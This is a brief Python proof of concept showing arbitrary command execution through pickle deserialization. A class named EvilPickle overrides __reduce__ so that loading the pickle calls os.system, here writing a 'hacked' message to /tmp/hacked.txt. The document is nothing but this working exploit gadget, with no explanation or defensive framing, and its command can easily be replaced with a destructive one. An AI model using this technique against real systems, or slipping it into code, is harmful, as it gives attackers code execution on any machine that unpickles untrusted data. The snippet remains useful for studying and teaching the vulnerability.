import pickle
import os

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo "You have been hacked!" > /tmp/hacked.txt',))

pickled = pickle.dumps(EvilPickle())
evil_obj = pickle.loads(pickled)
